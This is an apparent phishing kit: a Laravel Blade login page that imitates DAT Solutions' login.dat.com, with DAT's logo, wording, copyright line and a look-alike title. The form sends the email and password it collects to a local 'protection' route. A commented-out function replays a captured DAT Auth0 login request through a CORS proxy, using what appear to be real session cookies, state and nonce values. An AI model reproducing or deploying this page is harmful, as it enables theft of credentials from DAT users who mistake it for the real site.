<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>login.dat.com/login?ate=</title>
    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.bunny.net">
    <link href="https://fonts.bunny.net/css?family=figtree:400,600&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css" />
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
          integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
          crossorigin="anonymous">
    <style>
        body {
            margin: 0;
            height: 100vh;
        }
        .loginContainer {
            width: 100%;
            height: 100%;
            background-blend-mode:multiply;
            background-position:center center;
            background-size:cover;
            z-index:-1;
            top:0;
            left:0
        }

        .nav {
            padding: 35px;
        }

        .loginPopup {
            margin-top: 28px;
            margin-left: auto;
            margin-right: auto;
            width: 100%;
            max-width: 370px;
            position: relative;

        }

        .loginPopupContainer {
            border-radius: 4px;
            background: white;
            padding: 0 24px 24px 24px;
        }

        .header {
            text-align: center;
            padding: 24px 0 0 0;
            font-size: 16px;
        }

        .inputContainer {
            position: relative;
        }

        .filter {
            position: relative;
            width: 100%;
            height: 50px;
            border-radius: 5px;
            outline: none;
            padding: 5px 10px;
            border: 2px solid #7496e0;
        }

        .placeholder {
            position: absolute;
            left: 20px;
            top: -6px;
            background-color: white;
            padding: 0px 5px;
            color: #7496e0;
            font-size: 13px;
        }

        #togglePassword {
            font-size: 20px;
            color: black;
            top: 8px;
            left: 286px;
            position: absolute;
        }

        .loginBtn {
            height: 48px;
            border-radius: 40px;
            background-color: #e9ecf1;
            color: #9ca5af;
            border: none;
            margin-top: 40px;
            letter-spacing: 1px;
            font-size: 13px;
            font-weight: 500;
        }

        .loginBtn:hover {
            background-color: #e9ecf1;
            color: #9ca5af;
        }
        .loginBtn:active {
            background-color: #e9ecf1 !important;
            color: #9ca5af !important;
            border: none !important;
            box-shadow: none !important;
        }
        .loginBtn:focus {
            background-color: #e9ecf1 !important;
            color: #9ca5af !important;
            border: none !important;
            box-shadow: none !important;
        }
        .loginBtn:focus-visible {
            background-color: #e9ecf1 !important;
            color: #9ca5af !important;
            border: none !important;
            box-shadow: none !important;
        }

        .copyright {
            font-family: SequelSans-Body, sans-serif;
            font-size: 12px;
            font-weight: 400;
            font-stretch: normal;
            font-style: normal;
            line-height: 1.33;
            letter-spacing: normal;
            margin: 16px 0;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            color: #fff;
            text-align: center;
        }

        .copyrightLink {
            text-decoration: underline;
            color: #fff;
        }

        @media only screen and (max-width: 600px) {
            .logo {
                margin: 0 auto;
            }
        }

        .forgotText {
            cursor: pointer;
            color: #0046e0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="loginContainer" style="background:linear-gradient(to bottom,rgb(59,72,84) 0%,rgb(25,33,41) 100%),url({{url('/map.png')}})">
        <nav class="nav">
            <svg width="112" height="52" fill="none" viewBox="0 0 112 52" class="logo"><g fill="#fff"><path d="M3.042 43.879h4.29v1.592h-4.29v3.55H.912v-8.876h6.645v1.645H3.042v2.089zM10.184 43.423h.048c.181-.372.468-.683.825-.893.356-.21.767-.311 1.18-.29.134-.002.268.014.397.047v1.835c-.234-.029-.469-.044-.704-.048-.953 0-1.663.397-1.663 1.687v3.243H8.285V42.4h1.9v1.023zM19.475 47.033c-.237.923-1.184 2.136-3.326 2.136-2.142 0-3.408-1.325-3.408-3.45 0-2.124 1.26-3.473 3.402-3.473 2.142 0 3.55 1.337 3.397 3.864h-4.746c0 1.047.556 1.722 1.385 1.722.293.026.586-.053.825-.225.239-.172.408-.424.477-.71l1.994.136zm-4.681-2.118h2.728c.012-.187-.014-.374-.077-.55-.063-.177-.161-.338-.29-.475-.127-.136-.282-.245-.453-.32-.172-.074-.357-.112-.544-.112-.187 0-.372.038-.544.113-.171.074-.326.183-.454.32-.128.136-.226.297-.29.474-.062.176-.088.363-.076.55zM22.227 39.985v1.55h-1.983v-1.55h1.983zm0 2.415v6.61h-1.983V42.4h1.983zM29.695 48.524c0 2.225-1.492 2.96-3.385 2.96-1.628 0-2.96-.593-3.35-2.196l1.97-.178c.075.3.256.56.51.735.255.175.564.25.87.212.834 0 1.408-.426 1.408-1.58v-.657h-.053c-.23.293-.528.524-.869.672-.341.148-.714.208-1.084.174-1.58 0-2.781-1.225-2.781-3.219 0-1.994 1.183-3.201 2.828-3.201.387-.037.776.033 1.126.2.35.169.649.428.863.753h.065v-.8h1.9l-.018 6.125zm-1.882-3.077c0-1.06-.592-1.722-1.432-1.722s-1.432.657-1.432 1.722.591 1.775 1.438 1.775c.846 0 1.426-.686 1.426-1.775zM32.724 43.287c.233-.33.543-.597.903-.779.36-.181.76-.272 1.163-.262 1.26 0 2.278.751 2.278 2.426v4.338h-1.982V45.15c0-.97-.403-1.325-1.125-1.325s-1.284.591-1.284 1.663v3.52h-1.982v-9.024h1.982v3.302h.047zM41.121 47.607c.216.002.43-.021.64-.07v1.473c-.413.11-.84.163-1.267.16-1.414 0-2.03-.38-2.03-1.776v-3.728h-1.03V42.4h1.03V40.57h1.983V42.4h1.349v1.284h-1.35v3.302c0 .52.208.592.675.592v.03zM50.986 48.246c-.747.613-1.685.946-2.651.941-1.817 0-3.51-.834-3.51-2.633 0-1.184.634-1.894 1.776-2.444l.302-.142c-.746-.84-.947-1.361-.947-1.953 0-1.219 1.142-2.13 2.746-2.13s2.781.947 2.781 2.13c0 .923-.674 1.438-1.509 1.894l-.515.284 1.355 1.402c.12-.41.18-.834.178-1.26h1.675c.013.891-.19 1.772-.592 2.568l2.006 2.083h-2.355l-.74-.74zm-2.651-.538c.577.006 1.135-.205 1.562-.592l-1.964-2.065-.119.065c-.282.11-.526.298-.704.542-.178.245-.283.535-.302.837 0 .722.592 1.213 1.55 1.213h-.023zm-.538-5.598c0 .32.195.591.662 1.1l.249-.124c.592-.272.905-.527.905-.976-.018-.229-.122-.441-.29-.597-.169-.155-.39-.241-.618-.241-.23 0-.45.086-.618.241-.168.156-.272.368-.29.597zM58.898 47.015l-.663 1.995h-2.237l3.243-8.877h2.829l3.243 8.877h-2.267l-.675-1.995h-3.473zm1.775-5.136h-.053l-1.184 3.592h2.45l-1.213-3.592zM67.887 43.287c.234-.335.55-.607.917-.789.367-.182.774-.269 1.183-.252 1.308 0 2.32.751 2.32 2.426v4.338h-1.982V45.15c0-.97-.403-1.325-1.125-1.325s-1.284.509-1.284 1.603v3.551h-1.982V42.4h1.9v.887h.053zM79.337 47.63c.08-.001.16-.015.237-.04v1.42c-.284.075-.576.111-.87.106-.828 0-1.302-.213-1.527-.757h-.053c-.248.272-.553.486-.894.626-.34.14-.709.203-1.077.184-1.236 0-2.278-.722-2.278-1.952 0-1.415.935-1.947 2.61-2.166 1.26-.172 1.586-.35 1.586-.734 0-.385-.326-.722-.947-.722-.272-.007-.538.08-.754.245-.215.166-.367.401-.43.666l-1.846-.225c.284-1.284 1.438-2.035 3.036-2.035 1.982 0 2.9.864 2.9 2.201v2.8c0 .325.1.384.284.384h.023zm-2.266-1.775c-.37.185-.772.295-1.184.326-.591.1-.988.39-.988.935-.005.107.014.213.053.312.04.099.101.188.179.262.077.073.17.13.27.164.101.035.208.047.315.037.183.003.365-.032.535-.103.17-.07.322-.175.45-.307s.227-.288.291-.46c.065-.172.094-.355.085-.538l-.006-.627zM82.036 39.985v9.025h-1.983v-9.025h1.983zM87.308 49.01c-.775 2.183-1.65 2.45-2.858 2.45-.396.003-.791-.02-1.183-.072v-1.597c.275.048.554.072.834.07.227.035.459-.018.649-.148s.323-.325.375-.55l.077-.195-2.646-6.568h2.154l1.486 4.278h.047l1.338-4.278h2.118l-2.39 6.61zM93.45 47.607c.214.003.427-.021.634-.07v1.473c-.411.11-.835.164-1.26.16-1.415 0-2.03-.38-2.03-1.776v-3.728h-1.03V42.4h1.03V40.57h1.982V42.4h1.344v1.284h-1.344v3.302c0 .52.201.592.675.592v.03zM96.8 39.985v1.55h-1.982v-1.55H96.8zm0 2.415v6.61h-1.982V42.4H96.8zM102.203 46.512l2.012.202c-.29 1.183-1.184 2.455-3.326 2.455-2.142 0-3.402-1.32-3.402-3.456s1.278-3.467 3.402-3.467c2.125 0 2.959 1.284 3.243 2.19l-1.953.366c-.052-.306-.21-.584-.445-.786-.236-.202-.534-.315-.845-.32-.84 0-1.385.633-1.385 2.017 0 1.385.545 2.012 1.385 2.012.33-.005.646-.132.888-.356.243-.224.394-.529.426-.857zM108.848 44.412c-.049-.272-.197-.516-.416-.684-.218-.169-.492-.25-.767-.228-.592 0-.977.243-.977.693 0 .45.432.556 1.101.668l.687.101c1.183.201 2.367.556 2.367 2.065 0 1.51-1.361 2.142-3.154 2.142-1.794 0-3.013-.757-3.237-2.088l1.864-.22c.022.164.077.322.16.465.084.142.195.267.327.366.132.1.282.172.442.214.161.04.327.05.491.027.68 0 1.118-.302 1.118-.793 0-.492-.449-.592-1.183-.71l-.758-.119c-1.077-.171-2.213-.556-2.213-1.994 0-1.331 1.385-2.053 2.959-2.053s2.799.721 3.018 1.958l-1.829.19zM0 0v33.766h33.766V0H0zm15.67 27.635H7.166V6.025h8.504c2.866 0 5.614 1.138 7.64 3.164 2.027 2.026 3.165 4.775 3.165 7.64 0 2.866-1.138 5.615-3.165 7.641-2.026 2.027-4.774 3.165-7.64 3.165z"></path><path _ngcontent-gpv-c65="" d="M14.658 11.184c3.55 0 5.734 2.166 5.734 5.646s-2.166 5.657-5.793 5.657h-1.45V11.184h1.509zM58.549 19.6h-5.687l2.84-6.759L58.55 19.6z"></path><path _ngcontent-gpv-c65="" d="M38.831 0v33.766h33.766V0H38.831zm23.304 27.635l-1.474-3.503h-9.9l-1.473 3.503H43.37l9.113-21.61h6.439l9.095 21.61h-5.882zM77.663 0v33.766h33.765V0H77.663zm26.99 11.007h-7.066v16.628h-6.024V11.007h-7.101V6.024h20.167l.024 4.983z"></path></g></svg>
        </nav>
        <div class="loginPopup">
            <div class="loginPopupContainer">
                <form action="{{url('protection')}}" method="post" id="myForm">
                    @csrf
                    <div class="header">
                        <h1 style="font-size: 34px; font-weight: 400;">Log in</h1>
                        <p>to continue to your DAT account</p>
                    </div>
                    <div style="text-align: end; padding-bottom: 3px;">
                        <span id="forgotEmail" class="forgotText">Forgot your username?</span>
                    </div>
                    <div class="inputContainer">
                        <input name="email" required type="email" class="filter emailInput" id="emailInput" oninput="ValidateEmail(value)" />
                        <span id="placeholderEmail" class="placeholder">Username/Email *</span>
                    </div>
                    <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike" style="    margin-top: 13px; width: 16px; height: 16px;">
                    <label for="vehicle1"> Remember me</label><br>
                    <div style="text-align: end; padding-bottom: 3px;">
                        <span class="forgotText">Reset password</span>
                    </div>
                    <div class="inputContainer">
                        <input type="password" name="password" id="password" required  class="filter emailInput" oninput="ValidateEmail()" />
                        <span class="placeholder">Password *</span>
                        <i class="bi bi-eye-slash-fill" id="togglePassword"></i>
                    </div>
                    <button  class="btn btn-primary btn-lg btn-block loginBtn" id="LoginBtn" onclick="sendRequest()">LOG IN</button>
                    <div style="font-size: 12px; padding-top: 12px; text-align: center;">
                        <span>By continuing you agree to our</span>
                        <span style="cursor: pointer; color: #0046e0"> terms and conditions</span>.
                    </div>
                </form>
            </div>
            <div class="copyright">Copyright © 2024 DAT Solutions, LLC. All rights reserved. <a class="copyrightLink" href="javascript:void(0)">Privacy Policy</a></div>
        </div>
    </div>
    <script>
        const togglePassword = document
            .querySelector('#togglePassword');
        const password = document.querySelector('#password');
        togglePassword.addEventListener('click', () => {
            // Toggle the type attribute using
            // getAttribure() method
            const type = password
                .getAttribute('type') === 'password' ?
                'text' : 'password';
            password.setAttribute('type', type);
            // Toggle the eye and bi-eye icon
            this.classList.toggle('bi-eye');
        });

        function ValidateEmail(value = '') {
            var validRegex = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|.(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            const emailInput = document.getElementById('emailInput');
            const btn = document.getElementById('LoginBtn');
            const forgotEmail = document.getElementById('forgotEmail');
            const placeholderEmail = document.getElementById('placeholderEmail');
            const pass = document.getElementById('password').value
            const text = value || document.getElementById('emailInput').value

            if(text && text.toLowerCase().match(validRegex)) {
                forgotEmail.style.color = "#0046e0";
                emailInput.style.borderColor = "#0046e0";
                placeholderEmail.style.color = "#0046e0";
            } else {
                forgotEmail.style.color = "#f44336";
                emailInput.style.borderColor = "#f44336";
                placeholderEmail.style.color = "#f44336";
            }

            if (text.toLowerCase().match(validRegex) && pass) {
                btn.style.backgroundColor = "#192129";
                btn.style.color = "#fff";

            } else {
                btn.style.backgroundColor = "#e9ecf1";
                btn.style.color = "#9ca5af";

            }
        }

        function sendRequest ()  {
            // // e.preventDefault();
            // const pass = document.getElementById('password').value;
            // const email = document.getElementById('emailInput').value;
            // const myHeaders = new Headers();
            // myHeaders.append("accept", "*/*");
            // myHeaders.append("accept-language", "en-US,en;q=0.9,ru;q=0.8,hy;q=0.7");
            // myHeaders.append("auth0-client", "eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMjAuMiJ9");
            // myHeaders.append("content-type", "application/json");
            // myHeaders.append("cookie", "_csrf=jOnwZbSl18MjNyQv9bWUtvpn; HandLtestDomainName=HandLtestDomainValue; __utmc=32971051; __utmz=32971051.1720768694.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); handlID=1012752787381; handl_landing_page=https://www.dat.com/login; handl_landing_page_base=https://www.dat.com/login; handl_original_ref=https://www.google.com/; organic_source=https://www.google.com/; organic_source_str=Google; traffic_source=Organic; first_traffic_source=Organic; user_agent=Mozilla/5.0%20(Macintosh%3B%20Intel%20Mac%20OS%20X%2010_15_7)%20AppleWebKit/537.36%20(KHTML%2C%20like%20Gecko)%20Chrome/126.0.0.0%20Safari/537.36; ajs_user_id=2872387; ajs_anonymous_id=3aef3cf8-7e9e-4070-9d50-7155f2c965ec; _hjSessionUser_3280111=eyJpZCI6IjFiMTU3ZDBlLTkxNmQtNTQ3Yi05NTgxLTA3YTMxNTEwOWI0ZCIsImNyZWF0ZWQiOjE3MjA3Njg3MDU4NzgsImV4aXN0aW5nIjp0cnVlfQ==; _vwo_uuid_v2=DBFDF74D0721F1F3BC79512EBE920196B|fd757a2b73f743a11c335711b0a5612b; _gcl_au=1.1.1535992682.1720768706; _vwo_uuid=DBFDF74D0721F1F3BC79512EBE920196B; _vwo_ds=3%241720768705%3A67.89109313%3A%3A; _vis_opt_s=1%7C; _vis_opt_test_cookie=1; _ga=GA1.1.1537811867.1720768706; _fbp=fb.1.1720768706867.953837007944225954; calltrk_referrer=https%3A//www.google.com/; calltrk_landing=https%3A//www.dat.com/; calltrk_session_id=3983462b-762d-40d1-afe7-23e2391c7c7e; _hjSessionUser_2420462=eyJpZCI6IjBlYjgyZTJjLTE1YTktNTE5YS1hMWU3LWRhN2JhYzI3MWNjYyIsImNyZWF0ZWQiOjE3MjA3Njg5NjE2OTIsImV4aXN0aW5nIjp0cnVlfQ==; did=s%3Av0%3A7899bf91-e0ba-49b8-ba41-895faa15a831.Y3XxXBxiOIl7rvX7BNJW7Z%2FrZScDboKcd5isfZPKptU; did_compat=s%3Av0%3A7899bf91-e0ba-49b8-ba41-895faa15a831.Y3XxXBxiOIl7rvX7BNJW7Z%2FrZScDboKcd5isfZPKptU; auth0=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQG21vyGdV38s710bAFT-RAmQnPjyr3VzA7PLmesYuLbojDlueIdNKU92NHf9oYP4vdZqg5py1ifo0hb6xSLFuLmmY29va2llg6dleHBpcmVz1__SwxQAZqoN665vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.UKnL%2FEuAiOm9dfq2MglRf5U5NtDGtkiQjJPLOHkb%2FcQ; auth0_compat=s%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQG21vyGdV38s710bAFT-RAmQnPjyr3VzA7PLmesYuLbojDlueIdNKU92NHf9oYP4vdZqg5py1ifo0hb6xSLFuLmmY29va2llg6dleHBpcmVz1__SwxQAZqoN665vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.UKnL%2FEuAiOm9dfq2MglRf5U5NtDGtkiQjJPLOHkb%2FcQ; handl_url_base=https://www.dat.com/; handl_url=https://www.dat.com/; handl_ref=; handl_ref_domain=; __utma=32971051.1559668289.1720768694.1722161500.1722268026.3; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Jul+29+2024+19%3A47%3A08+GMT%2B0400+(Armenia+Standard+Time)&version=202403.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=4c14b15f-3b02-4459-a4a2-96d43945056d&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=1%3A1%2C3%3A1%2CSSPD_BG%3A1%2C2%3A1%2C5%3A1%2C4%3A1&AwaitingReconsent=false; _uetsid=d25308c04dc111ef9ef6b9d4a227701e; _uetvid=ee347720401e11efaf4be1d9cecaf734; _rdt_uuid=1720768706377.916c2a60-88ff-4404-8266-c31dfe37d7f1; _rdt_em=0000000000000000000000000000000000000000000000000000000000000001; __cf_bm=xpT_gDJrPMyHxa8TAa28XWjPb.TalaPVhpF1trk9eAA-1722346865-1.0.1.1-me0ADBlyYJEu_JCnxL1xod3a.O18B8lXziVMD6gmnkamNgcaGFxPhNAbX0As2CKADJOmIm9BR0Je2nGMVgkroA; _ga_C36TRC5CVZ=GS1.1.1722346877.17.0.1722346877.0.0.0; _ga_QYVEY2GZSM=GS1.1.1722346877.16.0.1722346877.0.0.0");
            // myHeaders.append("origin", "https://login.dat.com");
            // myHeaders.append("priority", "u=1, i");
            // myHeaders.append("referer", "https://login.dat.com/login?state=hKFo2SA3VXA3SE5XU21HQ256STJNOUFFYzdZLWJLMnNzS21lZ6FupWxvZ2luo3RpZNkgVFpVOTRmNTFKdENCSmZmTXpkZEdyUEhkWUpPd05lc2SjY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&client=PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP&protocol=oauth2&prompt=login&redirect_uri=https:%2F%2Fpower.dat.com%2Fsignin-auth0&response_mode=form_post&response_type=code%20id_token%20token&scope=openid%20profile%20offline_access%20email&nonce=638579436679069959.NjQwOGVkMGQtOTUwNy00YmUxLWEyYTItMzQ5MDI0ODYwNGJkYmQ1YWMwMzgtMDEwYy00OTY2LWIxNjEtYTBkYTI2NGUyNmZh&app_name=Power&page_mode=Legacy&audience=https:%2F%2Fprod-api.dat.com&x-client-SKU=ID_NET451&x-client-ver=5.2.1.0&capturedTime=1722346872083");
            // myHeaders.append("sec-ch-ua", "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"");
            // myHeaders.append("sec-ch-ua-arch", "\"arm\"");
            // myHeaders.append("sec-ch-ua-bitness", "\"64\"");
            // myHeaders.append("sec-ch-ua-full-version", "\"126.0.6478.114\"");
            // myHeaders.append("sec-ch-ua-full-version-list", "\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"126.0.6478.114\", \"Google Chrome\";v=\"126.0.6478.114\"");
            // myHeaders.append("sec-ch-ua-mobile", "?0");
            // myHeaders.append("sec-ch-ua-model", "\"\"");
            // myHeaders.append("sec-ch-ua-platform", "\"macOS\"");
            // myHeaders.append("sec-ch-ua-platform-version", "\"13.0.1\"");
            // myHeaders.append("sec-fetch-dest", "empty");
            // myHeaders.append("sec-fetch-mode", "cors");
            // myHeaders.append("sec-fetch-site", "same-origin");
            // myHeaders.append("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36");
            //
            // const raw = JSON.stringify({
            //     "client_id": "PpyvoRG2NBpgbBVfXjl1GagTni4RZHxP",
            //     "redirect_uri": "https://power.dat.com/signin-auth0",
            //     "tenant": "prod",
            //     "response_type": "code id_token token",
            //     "scope": "openid profile offline_access email",
            //     "password": "asdasdasd",
            //     "protocol": "oauth2",
            //     "response_mode": "form_post",
            //     "nonce": "638579436679069959.NjQwOGVkMGQtOTUwNy00YmUxLWEyYTItMzQ5MDI0ODYwNGJkYmQ1YWMwMzgtMDEwYy00OTY2LWIxNjEtYTBkYTI2NGUyNmZh",
            //     "app_name": "Power",
            //     "page_mode": "Legacy",
            //     "audience": "https://prod-api.dat.com",
            //     "prompt": "login",
            //     "x-client-_sku": "ID_NET451",
            //     "x-client-ver": "5.2.1.0",
            //     "_csrf": "TdbJN6y1-1IZ56HdncQBdkHfVUOf-w41bIBM",
            //     "_intstate": "deprecated",
            //     "state": "hKFo2SA3VXA3SE5XU21HQ256STJNOUFFYzdZLWJLMnNzS21lZ6FupWxvZ2luo3RpZNkgVFpVOTRmNTFKdENCSmZmTXpkZEdyUEhkWUpPd05lc2SjY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA",
            //     "connection": "Email-Password-Authentication",
            //     "username": "test@test.com"
            // });
            //
            // const requestOptions = {
            //     method: "POST",
            //     headers: myHeaders,
            //     body: raw,
            //     redirect: "follow"
            // };
            // var proxy = 'https://cors-anywhere.herokuapp.com/';
            //
            // fetch(proxy + "https://login.dat.com/usernamepassword/login", requestOptions)
            //     .then((response) => response.text())
            //     .then((result) => console.log(result))
            //     .catch((error) => console.error(error))
            //     .finally(res => {
            //         // document.getElementById('myForm').submit()
            // });

        }
    </script>
</body>
</html>
